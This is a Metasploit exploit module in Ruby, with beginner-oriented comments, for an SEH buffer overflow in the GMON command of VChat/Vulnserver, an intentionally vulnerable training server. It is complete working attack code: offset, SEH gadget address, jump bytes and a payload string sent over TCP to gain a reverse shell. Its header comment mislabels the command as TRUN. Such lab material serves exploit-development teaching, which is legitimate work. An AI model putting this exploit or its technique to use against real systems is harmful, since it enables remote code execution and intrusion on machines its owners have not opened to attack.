##
# The # symbol starts a comment
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
# File path: .msf4/modules/exploits/windows/vulnserver/knock.rb
##
# This module exploits the TRUN command of vulnerable chat server
##

class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module inheriting from the remote exploit class
    Rank = NormalRanking	# Potential impact to the target
  
    include Msf::Exploit::Remote::Tcp	# Include remote tcp exploit module
  
    def initialize(info = {})	# i.e. constructor, setting the initial values
      super(update_info(info,
        'Name'           => 'VChat/Vulnserver Buffer Overflow-GMON command SEH Exploitation',	# Name of the target
        'Description'    => %q{	# Explaining what the module does
           This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell. 
        },
        'Author'         => [ 'fxw' ],	## Hacker name
        'License'        => MSF_LICENSE,
        'References'     =>	# References for the vulnerability or exploit
          [
            #[ 'URL', 'https://github.com/DaintyJet/Making-Dos-DDoS-Metasploit-Module-Vulnserver/'],
            [ 'URL', 'https://github.com/DaintyJet/VChat_GMON_SEH' ]
  
          ],
        'Privileged'     => false,
        'DefaultOptions' =>
          {
            'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
          },      
        'Payload'        =>	# How to encode and generate the payload
          {
            'BadChars' => "\x00\x0a\x0d"	# Bad characters to avoid in generated shellcode
          },
        'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
        'Targets'        =>	#  targets for many exploits
        [
          [ 'EssFuncDLL-seh-gadget',
            {
              'seh-gadget' => 0x62501067 # This will be available in [target['jmpesp']]
            }
          ]
        ],
        'DefaultTarget'  => 0,
        'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public
        
        register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
            [
            OptInt.new('RETOFFSET_GMON', [true, 'Offset of SEH Handler in the function GMON', 3571]),
            OptString.new('LONG_JUMP', [true, 'Long Jump Instruction, Provided in HEX Digits', "\xe9\x46\xf2\xff\xff"]),
            Opt::RPORT(9999),
            Opt::RHOSTS('192.168.7.191')
        ])
        
    end
    def exploit	# Actual exploit  
      print_status("Connecting to target...")
      connect	# Connect to the target
      
      shellcode = payload.encode()
      long_jump = datastore['LONG_JUMP'].gsub(/\\x([0-9a-fA-F]{2})/) { $1.to_i(16).chr }


      outbound_GTER = 'GMON /.:/' + "\x90"*100 + shellcode + "\x90"*(datastore['RETOFFSET_GMON'] - 100 - 4 - shellcode.length()) + "\xeb\x08" + "\x90\x90" + [target['seh-gadget']].pack('V') + "\x90\x90" + long_jump + "F"*1500 # Create the malicious string that will be sent to the target
  
      print_status("Sending Exploit")
      sock.puts(outbound_GTER)	# Send the attacking payload
      disconnect
    end
  end
  